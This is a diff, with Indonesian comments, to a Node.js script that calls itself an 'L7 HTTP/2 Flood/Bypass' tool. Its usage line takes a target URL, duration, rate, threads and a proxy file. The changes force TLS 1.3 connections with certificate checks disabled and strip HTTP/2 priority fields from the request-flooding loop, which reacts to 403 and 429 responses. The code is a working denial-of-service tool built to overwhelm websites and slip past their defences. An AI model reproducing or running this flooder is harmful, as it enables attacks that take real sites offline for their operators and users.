@@ -117,12 +117,14 @@ const sigalgs = [
 ];
 let SignalsList = sigalgs.join(':');
 const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
+
+// ========== PERUBAHAN: HAPUS SSL_OP_NO_TLSv1_3 ==========
 const secureOptions =
     crypto.constants.SSL_OP_NO_SSLv2 |
     crypto.constants.SSL_OP_NO_SSLv3 |
     crypto.constants.SSL_OP_NO_TLSv1 |
     crypto.constants.SSL_OP_NO_TLSv1_1 |
-    crypto.constants.SSL_OP_NO_TLSv1_3 |
+    // crypto.constants.SSL_OP_NO_TLSv1_3 |   // <-- DIHAPUS
     crypto.constants.ALPN_ENABLED |
     crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
     crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
@@ -136,9 +138,9 @@ const secureOptions =
 
 if (process.argv.length < 7) {
     console.clear();
-    console.log(' L7 HTTP/2 Flood/Bypass - Gabungan W-FLOOD & Bypass (Optimasi Kecepatan)');
+    console.log(' L7 HTTP/2 Flood/Bypass - TLS 1.3 ONLY');
     console.log('────────────────────────────────────────────────────────────');
-    console.log(' Usage: '.blue + 'node h2.js host time rate threads proxyfile'.white);
+    console.log(' Usage: '.blue + 'node lev.js host time rate threads proxyfile'.white);
     console.log('────────────────────────────────────────────────────────────');
     console.log('<host>      = '.white + 'Target URL (example: https://example.com)'.blue);
     console.log('<time>      = '.white + 'Duration in seconds'.blue);
@@ -671,6 +673,7 @@ function runFlooder() {
         connection.setKeepAlive(true, 600000);
         connection.setNoDelay(true);
 
+        // ========== PERUBAHAN: FORCE TLS 1.3 ==========
         const tlsOptions = {
             secure: true,
             ALPNProtocols: ["h2", "http/1.1"],
@@ -682,10 +685,12 @@ function runFlooder() {
             secureContext: secureContext,
             honorCipherOrder: false,
             rejectUnauthorized: false,
-            secureProtocol: Math.random() < 0.5 ? ['TLSv1.3_method', 'TLSv1.2_method'] : ['TLSv1.3_method'],
+            secureProtocol: 'TLS_method',   // <-- gunakan string, bukan array
             secureOptions: secureOptions,
             host: parsedTarget.host,
             servername: parsedTarget.host,
+            minVersion: 'TLSv1.3',          // <-- hanya TLS 1.3
+            maxVersion: 'TLSv1.3'
         };
 
         const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
@@ -758,11 +763,8 @@ function runFlooder() {
                 if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                     for (let i = 0; i < requestsPerInterval; i++) {
                         const requestPromise = new Promise((resolve, reject) => {
-                            const req = client.request(dynHeaders, {
-                                weight: Math.random() < 0.5 ? 251 : 231,
-                                depends_on: 0,
-                                exclusive: Math.random() < 0.5 ? true : false,
-                            })
+                            // ========== PERUBAHAN: HAPUS weight/depends_on/exclusive ==========
+                            const req = client.request(dynHeaders, {})
                             .on('response', response => {
                                 const status = response[':status'];
                                 if (status === 403 || status === 429) {
